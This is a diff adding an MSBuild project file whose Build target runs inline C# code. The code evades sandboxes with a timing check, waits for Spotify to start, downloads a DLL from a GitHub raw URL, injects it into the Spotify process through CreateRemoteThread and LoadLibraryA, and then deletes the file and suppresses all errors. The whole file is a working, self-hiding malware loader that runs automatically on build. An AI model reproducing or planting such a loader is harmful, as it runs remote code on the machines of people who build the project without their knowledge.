@@ -1,0 +1,109 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <INJ />
+  </Target>
+  <UsingTask TaskName="INJ" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup/>
+    <Task>
+      <Reference Include="System.Core"/>
+      <Using Namespace="System"/>
+      <Using Namespace="System.Diagnostics"/>
+      <Using Namespace="System.Runtime.InteropServices"/>
+      <Using Namespace="System.Net"/>
+      <Using Namespace="System.IO"/>
+      <Using Namespace="System.Threading"/>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.IO;
+using System.Threading;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class INJ : Task
+{
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int c);
+    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out int w);
+    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint st, IntPtr fn, IntPtr p, uint f, out uint t);
+    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint m);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")] static extern bool VirtualFreeEx(IntPtr h, IntPtr a, uint s, uint t);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);
+
+    public override bool Execute()
+    {
+        try
+        {
+            // Anti-Sandbox
+            int t = Environment.TickCount;
+            Thread.Sleep(1000);
+            if (Environment.TickCount - t < 900) return true;
+
+            // Find Spotify
+            int pid = 0;
+            for (int i = 0; i < 30; i++)
+            {
+                foreach (var p in Process.GetProcessesByName("Spotify"))
+                { pid = p.Id; break; }
+                if (pid != 0) break;
+                Thread.Sleep(1000);
+            }
+            if (pid == 0) return true;
+
+            Thread.Sleep(500);
+
+            // Download DLL
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            byte[] dll = new WebClient().DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");
+            if (dll == null || dll.Length < 0x1000) return true;
+
+            // Temp file (random name, kurz)
+            string tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().Substring(0, 8) + ".tmp");
+            File.WriteAllBytes(tmp, dll);
+
+            // Open process
+            IntPtr hp = OpenProcess(0x1F0FFF, false, pid);
+            if (hp == IntPtr.Zero) { try { File.Delete(tmp); } catch { } return true; }
+
+            // Allocate memory for path
+            byte[] path = System.Text.Encoding.ASCII.GetBytes(tmp + "\0");
+            IntPtr mem = VirtualAllocEx(hp, IntPtr.Zero, (uint)path.Length, 0x3000, 0x04);
+            if (mem == IntPtr.Zero) { CloseHandle(hp); try { File.Delete(tmp); } catch { } return true; }
+
+            // Write path
+            int w;
+            WriteProcessMemory(hp, mem, path, (uint)path.Length, out w);
+
+            // Get LoadLibraryA
+            IntPtr ll = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+
+            // Create remote thread
+            uint tid;
+            IntPtr ht = CreateRemoteThread(hp, IntPtr.Zero, 0, ll, mem, 0, out tid);
+
+            if (ht != IntPtr.Zero)
+            {
+                WaitForSingleObject(ht, 10000);
+                CloseHandle(ht);
+            }
+
+            // Cleanup
+            VirtualFreeEx(hp, mem, 0, 0x8000);
+            CloseHandle(hp);
+
+            // Delete DLL after load
+            Thread.Sleep(2000);
+            try { File.Delete(tmp); } catch { }
+        }
+        catch { }
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
